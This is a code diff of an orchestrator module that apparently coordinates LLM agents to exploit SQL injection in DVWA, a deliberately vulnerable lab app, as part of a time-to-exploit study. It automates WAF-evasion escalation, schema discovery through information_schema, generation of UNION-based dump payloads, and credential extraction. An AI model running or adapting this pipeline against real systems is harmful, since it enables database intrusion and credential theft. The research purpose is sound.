@@ -1,57 +1,35 @@
-"""Orchestrator: the control loop that mirrors PentAGI's coordinator.
+"""Orchestrator: coordina a los tres agentes para explotar una SQL injection SIN conocer el esquema.
 
-It logs in, sets the DVWA level, asks the Planner for a strategy and CLEAN base payloads, then
-drives two decoupled layers:
-  * CONTENT (the SQL itself) comes from the Planner/Executor (the LLM).
-  * SURFACE (how the payload looks on the wire) comes from the deterministic EvasionEngine.
-
-On a WAF block the engine escalates the surface form of the SAME base (comments, case, encoding…)
-without bothering the model; only when the surface passes the WAF but the SQL is wrong does it ask
-the Executor/Planner for different content. It bounds the run by steps and wall-clock time and
-records the time-to-exploit used as the study's metric, plus the WAF profile it learned."""
+Flujo (como un pentester real, todo averiguado por comandos, nada hardcodeado):
+  1. Login y fijar el nivel de seguridad.
+  2. El Planner plantea la metodología (UNION-based sobre MySQL), sin asumir tablas ni columnas.
+  3. El descubrimiento (determinista + evasión de WAF) averigua: contexto de comillas, nº de
+     columnas, columnas reflejadas, tablas y columnas — vía ORDER BY e information_schema.
+  4. El Analyst decide cuáles columnas descubiertas son usuario/contraseña.
+  5. El Executor GENERA el payload de extracción desde ese esquema (con respaldo determinista).
+  6. Se extraen las credenciales. Se mide el tiempo hasta la explotación (métrica del estudio)."""
 from __future__ import annotations
 
-import re
 import time
-from typing import Any, Callable, Optional
+from typing import Callable, Optional
 
 from .agents import Analyst, Executor, Planner
+from .discovery import ProbeResult, SchemaDiscovery, pick_credential_columns
 from .dvwa import DVWAClient
 from .evasion import EvasionEngine
 from .llm import OllamaClient
-from .types import Attempt, RunResult
+from .types import RunResult
 
 Logger = Optional[Callable[[str], None]]
 
-MAX_REPLANS = 6  # cap LLM re-plans so an unhelpful model cannot loop forever
 
-
-def _candidate_payload(candidate: Any) -> str:
-    if isinstance(candidate, dict):
-        return str(candidate.get("payload", ""))
-    return str(candidate or "")
-
-
-_HASH_RE = re.compile(r"^[a-f0-9]{32,}$", re.IGNORECASE)
-
-
-def _credential_rows(rows: list[dict[str, str]]) -> list[dict[str, str]]:
-    """Rows whose surname column is a password hash — deterministic proof of a dump,
-    independent of the LLM analyst's judgement."""
-    creds: list[dict[str, str]] = []
-    for row in rows:
-        surname = row.get("surname", "")
-        if _HASH_RE.match(surname):
-            creds.append({"username": row.get("first_name", ""), "hash": surname})
-    return creds
-
-
-def _history(attempts: list[Attempt]) -> str:
-    return "; ".join(
-        f"#{a.step} {a.payload!r}->"
-        + ("WAF-BLOCKED" if a.response.blocked else a.analysis.get("assessment", ""))
-        for a in attempts[-4:]
-    )
+def _valid_dump(crafted: dict, table: str, cred_columns: tuple[str, str]) -> bool:
+    """Valida el payload que generó el LLM; si no sirve, se usa el determinista."""
+    p = str(crafted.get("payload", "")).strip().lower()
+    if not p:
+        return False
+    u, pw = cred_columns[0].lower(), cred_columns[1].lower()
+    return "union" in p and "select" in p and table.lower() in p and u in p and pw in p
 
 
 class Orchestrator:
@@ -70,97 +48,77 @@ class Orchestrator:
     ) -> RunResult:
         say = log or (lambda _msg: None)
         start = time.monotonic()
+        deadline = start + timeout_seconds
 
         if not self.dvwa.login():
             raise RuntimeError("DVWA login failed — check the URL and credentials in config.py")
         self.dvwa.set_security(level)
-        say(f"[Orchestrator] logged in, security level set to '{level}'")
+        say(f"[Orchestrator] login ok, nivel de seguridad '{level}'")
 
         engine = EvasionEngine()
-        plan = self.planner.plan(level)
-        strategy = str(plan.get("strategy", ""))
-        bases_queue: list[str] = [p for p in (_candidate_payload(c) for c in plan.get("payloads") or []) if p]
-        say(f"[Planner] strategy: {strategy}")
+        counter = {"steps": 0}
 
-        attempts: list[Attempt] = []
+        def probe(base_sql: str) -> ProbeResult:
+            # Envío consciente del WAF: escala disfraces hasta que uno pasa (o se agota la escalera).
+            while True:
+                if counter["steps"] >= max_steps or time.monotonic() > deadline:
+                    return ProbeResult(blocked=True)
+                payload, pipeline = engine.next_payload(base_sql)
+                if payload is None:
+                    return ProbeResult(blocked=True)
+                counter["steps"] += 1
+                resp = self.dvwa.run_sqli(payload, level)
+                if resp.blocked:
+                    say(f"[WAF] bloqueó (HTTP {resp.http_status}) — escalando evasión")
+                    engine.record(pipeline, payload, blocked=True)
+                    continue
+                engine.record(pipeline, payload, blocked=False)
+                cells = [[r.get("first_name", ""), r.get("surname", "")] for r in resp.rows]
+                return ProbeResult(cells=cells, db_error=resp.db_error, blocked=False)
+
+        # El Planner plantea la metodología (no asume esquema).
+        strategy = str(self.planner.plan(level).get("strategy", ""))
+        say(f"[Planner] {strategy}")
+
+        # El Analyst elige las columnas de credenciales; si falla, respaldo determinista.
+        def pick(table: str, columns: list[str]) -> Optional[tuple[str, str]]:
+            picked = self.analyst.pick_credentials(table, columns)
+            if picked and picked[0] in columns and picked[1] in columns:
+                say(f"[Analyst] credenciales en {table!r}: {picked}")
+                return picked
+            return pick_credential_columns(table, columns)
+
+        # Descubrir el esquema por comandos (ORDER BY, information_schema).
+        discovery = SchemaDiscovery(probe, say=say, pick=pick)
+        res = discovery.discover()
+
         extracted: list[dict[str, str]] = []
         success = False
-        last_hint = ""
-        replans = 0
-        step = 0
-
-        def next_base() -> Optional[str]:
-            # Consigue el siguiente payload base; si se agotan, el Planner propone otros
-            nonlocal bases_queue, strategy, replans
-            while True:
-                if bases_queue:
-                    candidate = bases_queue.pop(0)
-                    crafted = self.executor.craft(level, strategy, candidate, _history(attempts), last_hint)  # el Executor arma el payload
-                    base = str(crafted.get("payload") or candidate).strip()
-                    if base:
-                        return base
-                    continue
-                if replans >= MAX_REPLANS:
-                    return None
-                replans += 1
-                feedback = last_hint or (
-                    "all attempted payloads were blocked or ineffective even after WAF evasion; "
-                    "try a DIFFERENT base technique (error-based, boolean-blind, different columns)"
-                )
-                p = self.planner.plan(level, feedback=feedback)  # el Planner cambia de estrategia
-                strategy = str(p.get("strategy", strategy))
-                bases_queue = [q for q in (_candidate_payload(c) for c in p.get("payloads") or []) if q]
-                say(f"[Planner] replan {replans}: {strategy}")
-                if not bases_queue:
-                    return None
-
-        current_base = next_base()
-        while current_base is not None and step < max_steps and (time.monotonic() - start) < timeout_seconds:
-            payload, pipeline = engine.next_payload(current_base)   # aplica el siguiente disfraz
-            if payload is None:  # ya se probaron todos los disfraces de este payload
-                current_base = next_base()
-                continue
-
-            step += 1
-            surface = list(pipeline) or ["plain"]
-            say(f"[Executor] step {step}: {payload!r}  [surface={surface}]")
-            response = self.dvwa.run_sqli(payload, level)           # envía el payload al objetivo
-
-            if response.blocked:                                    # el WAF lo rechazó
-                say(f"[WAF] blocked (HTTP {response.http_status}) — escalating evasion")
-                engine.record(pipeline, payload, blocked=True)
-                attempts.append(
-                    Attempt(step, payload, f"surface={surface}", response,
-                            {"assessment": "WAF blocked", "next_action": "evade", "blocked": True})
-                )
-                continue  # mismo payload, probamos un disfraz más fuerte
-
-            engine.record(pipeline, payload, blocked=False)  # este disfraz sí pasó el WAF
-            analysis = self.analyst.analyze(level, payload, response)   # el Analyst revisa la respuesta
-            attempts.append(Attempt(step, payload, f"surface={surface}", response, analysis))
-            say(f"[Analyst] {analysis.get('assessment', '')} -> {analysis.get('next_action', '')}")
-
-            creds = _credential_rows(response.rows)
-            if creds or analysis.get("data_found") or (response.rows and analysis.get("injected")):
-                extracted = creds or analysis.get("extracted") or [
-                    {"username": r.get("first_name", ""), "hash": r.get("surname", "")}
-                    for r in response.rows
-                ]
-                success = True                                      # se extrajeron credenciales
-                say(f"[Orchestrator] SUCCESS at step {step}")
-                break
-
-            last_hint = str(analysis.get("hint", ""))
-            current_base = next_base()  # el disfraz pasó pero el SQL falló: probamos otro payload
+        if res.cred_columns[0]:
+            # El Executor GENERA el payload desde el esquema descubierto; se valida y hay respaldo.
+            crafted = self.executor.craft_dump(
+                res.quote, res.columns, res.reflected, res.target_table, res.cred_columns
+            )
+            template = discovery.build_dump_payload(res)
+            payload = str(crafted.get("payload", "")).strip() if _valid_dump(
+                crafted, res.target_table, res.cred_columns
+            ) else template
+            say(f"[Executor] payload de extracción: {payload!r}")
+            extracted = discovery.extract(payload, res)
+            success = bool(extracted)
+            if success:
+                say(f"[Orchestrator] SUCCESS — {len(extracted)} credenciales extraídas")
+        if not success:
+            say("[Orchestrator] FAILED — no se extrajeron credenciales")
 
         elapsed = time.monotonic() - start
         return RunResult(
             level=level,
             success=success,
             elapsed_seconds=round(elapsed, 2),
-            steps_used=step,
+            steps_used=counter["steps"],
             extracted=extracted,
             strategy=strategy,
-            attempts=attempts,
+            trace=res.trace,
             waf_profile=engine.profile.summary(),
         )
